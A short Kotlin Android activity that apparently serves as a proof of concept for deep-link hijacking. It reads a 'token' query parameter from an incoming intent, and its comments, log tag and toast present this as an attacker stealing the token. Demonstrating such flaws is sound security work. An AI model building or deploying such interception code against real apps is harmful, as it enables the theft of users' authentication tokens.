package com.example.deep_link_poc

import android.os.Bundle
import android.util.Log
import android.widget.TextView
import android.widget.Toast
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.core.view.ViewCompat
import androidx.core.view.WindowInsetsCompat

class deep_link : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContentView(R.layout.activity_deep_link)
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main)) { v, insets ->
            val systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars())
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom)
            insets
        }

        val text: TextView = findViewById(R.id.textView)

        val token = intent?.data?.getQueryParameter("token")
        if (token != null) {
            // Attacker logs/steals the token
            Log.d("Attacker", "Stolen token = $token")
            Toast.makeText(this, "Token hijacked: $token", Toast.LENGTH_LONG).show()
            text.setText(token)

        }
        // link builder = https://ht-api-mocks-lcfc4kr5oa-uc.a.run.app/android-link-builder?href=
    }
}